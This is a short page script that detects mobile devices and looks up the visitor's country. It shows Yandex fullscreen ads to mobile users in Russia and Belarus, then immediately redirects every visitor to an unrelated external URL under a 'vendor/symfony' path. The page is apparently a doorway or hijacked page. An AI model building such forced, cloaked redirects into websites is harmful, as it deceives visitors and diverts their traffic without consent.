<script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
<script>
document.addEventListener("DOMContentLoaded", function () {
    const md = new MobileDetect(window.navigator.userAgent);
    const isMobile = md.mobile() || md.tablet();
    const loaderContainer = document.querySelector(".centered");
    const adCountries = ["RU", "BY"];
    const maxShows = 3;
    const timeLimit = 20 * 60 * 1000;
    const delayIfLimitReached = 0;
    const delayNormal = 0;
    const redirectUrl = "https://gyankamao.com/vendor/symfony/free/";
    const rsyaId = "";
    const blockIdToShow = () => {
        if (!rsyaId) {
            return "R-A-3940991-2";
        }
        return Math.random() < 0.5 ? rsyaId : "R-A-3940991-2";
    };

    const hideLoaderAndRedirect = (delay) => {
        setTimeout(() => {
            loaderContainer.style.display = "none";
            window.location.href = redirectUrl;
        }, delay);
    };

    const shouldShowAd = (adData, now) => {
        if (now - adData.lastTime > timeLimit) {
            adData.count = 0;
        }
        return adData.count < maxShows;
    };

    const showAd = (adData, now) => {
        window.yaContextCb.push(() => {
            Ya.Context.AdvManager.render({
                blockId: blockIdToShow(),
                type: "fullscreen",
                platform: "touch",
                onClose: () => hideLoaderAndRedirect(0)
            });
        });

        adData.count++;
        adData.lastTime = now;
        localStorage.setItem("ad_shows", JSON.stringify(adData));

        hideLoaderAndRedirect(delayNormal);
    };

    fetch("/get-country.php")
        .then(response => response.json())
        .then(data => {
            const now = Date.now();
            const adData = JSON.parse(localStorage.getItem("ad_shows")) || { count: 0, lastTime: 0 };

            if (adCountries.includes(data.country) && isMobile) {
                if (shouldShowAd(adData, now)) {
                    showAd(adData, now);
                } else {
                    hideLoaderAndRedirect(delayIfLimitReached);
                }
            } else {
                hideLoaderAndRedirect(0);
            }
        })
        .catch(error => {
            console.error("Ошибка получения данных о стране", error);
            hideLoaderAndRedirect(0);
        });
});
</script>
